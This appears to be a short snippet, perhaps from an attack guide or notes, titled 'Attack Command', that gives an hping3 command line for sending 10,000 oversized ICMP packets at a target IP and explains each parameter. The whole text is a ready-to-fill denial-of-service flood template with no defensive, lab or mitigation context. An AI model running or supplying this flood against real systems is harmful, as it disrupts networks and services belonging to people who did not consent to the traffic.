## Attack Command
Send oversized ICMP packets using:

```bash
hping3 -d <payload_size> -c 10000 --icmp -I <interface> <target_ip>
Parameters:
-d <payload_size>: Size of the packet payload.
-c 10000: Number of packets to send.
--icmp: Sends ICMP packets.
-I <interface>: Network interface.
<target_ip>: Replace with the target's IP.
